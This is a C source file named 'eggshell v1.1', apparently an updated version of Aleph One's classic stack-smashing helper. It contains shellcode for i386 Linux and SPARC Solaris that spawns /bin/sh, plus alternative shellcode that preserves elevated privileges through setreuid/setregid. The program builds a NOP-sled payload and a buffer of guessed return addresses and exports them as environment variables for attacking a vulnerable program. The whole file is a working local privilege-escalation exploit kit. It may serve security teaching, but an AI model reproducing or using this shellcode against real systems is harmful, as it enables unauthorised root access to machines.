#if defined(__i386__) && defined(__linux__)
#define NOP_SIZE 1
char nop[] = "\x90";
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
// Alternative shellcode also executing setreuid(geteuid(), geteuid()) (https://www.exploit-db.com/exploits/13338)
char *alt_shellcode =
    "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50"
    "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31"
    "\xd2\xb0\x0b\xcd\x80";
unsigned long get_sp(void) {
    unsigned long result;
    asm("movl %%esp,%0"
        : "=g"(result));
    return result;
}
#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
#define NOP_SIZE 4
char nop[] = "\xac\x15\xa1\x6e";
char shellcode[] =
    "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
    "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
    "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
    "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
// Alternative shellcode also executing setreuid(geteuid()), setregid(getegid()) (https://www.exploit-db.com/shellcodes/43621)
// ATTENTION: NOT TESTED
char *alt_shellcode =
    "\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08"
    "\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08"
    "\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
    "\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8"
    "\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23"
    "\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08"
    "\x82\x10\x20\x01\x91\xd0\x20\x08";
unsigned long get_sp(void) {
    __asm__("or %sp, %sp, %i0");
}
#elif defined(__sparc__) && defined(__sun__)
#define NOP_SIZE 4
char nop[] = "\xac\x15\xa1\x6e";
char shellcode[] =
    "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
    "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
    "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
    "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
// Alternative shellcode also executing setreuid(geteuid()), setregid(getegid()) (https://www.exploit-db.com/shellcodes/43621)
// ATTENTION: NOT TESTED
char *alt_shellcode =
    "\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08"
    "\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08"
    "\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
    "\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8"
    "\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23"
    "\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08"
    "\x82\x10\x20\x01\x91\xd0\x20\x08";
unsigned long get_sp(void) {
    __asm__("or %sp, %sp, %i0");
}
#endif

/*
* eggshell v1.1
*
* Aleph One / aleph1@underground.org
* Florian Hofhammer / florian.hofhammer@polytechnique.edu
*/
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048

void usage(void);

void main(int argc, char *argv[]) {
    char *ptr, *bof, *egg, *sc;
    long *addr_ptr, addr;
    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    int i, n, m, c, align = 0, eggsize = DEFAULT_EGG_SIZE;
    // Point to normal shellcode by default
    sc = shellcode;

    while ((c = getopt(argc, argv, "a:b:e:o:s")) != EOF)
        switch (c) {
            case 'a':
                align = atoi(optarg);
                break;
            case 'b':
                bsize = atoi(optarg);
                break;
            case 'e':
                eggsize = atoi(optarg);
                break;
            case 'o':
                offset = atoi(optarg);
                break;
            case 's':
                sc = alt_shellcode;
                break;
            case '?':
                usage();
                exit(0);
        }

    if (strlen(sc) > eggsize) {
        printf("Shellcode is larger the the egg.\n");
        exit(0);
    }
    if (!(bof = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }
    if (!(egg = malloc(eggsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
           bsize, eggsize, align);
    printf("[ Address:\t0x%lx\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);

    addr_ptr = (long *)bof;
    for (i = 0; i < bsize; i += 4)
        *(addr_ptr++) = addr;

    ptr = egg;
    for (i = 0; i < eggsize - strlen(sc) - NOP_SIZE; i += NOP_SIZE) {
        // Fixed error here: was i <=, has to be i <
        // Otherwise, the last byte of the shellcode is overwritten with 0x00 below
        for (n = 0; n < NOP_SIZE; n++) {
            m = (n + align) % NOP_SIZE;
            *(ptr++) = nop[m];
        }
    }
    for (i = 0; i < strlen(sc); i++)
        *(ptr++) = sc[i];

    bof[bsize - 1] = '\0';
    egg[eggsize - 1] = '\0';

    memcpy(egg, "EGG=", 4);
    putenv(egg);
    memcpy(bof, "BOF=", 4);
    putenv(bof);
    system("/bin/bash");
}

void usage(void) {
    fprintf(stderr, "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>] [-s]\n");
}
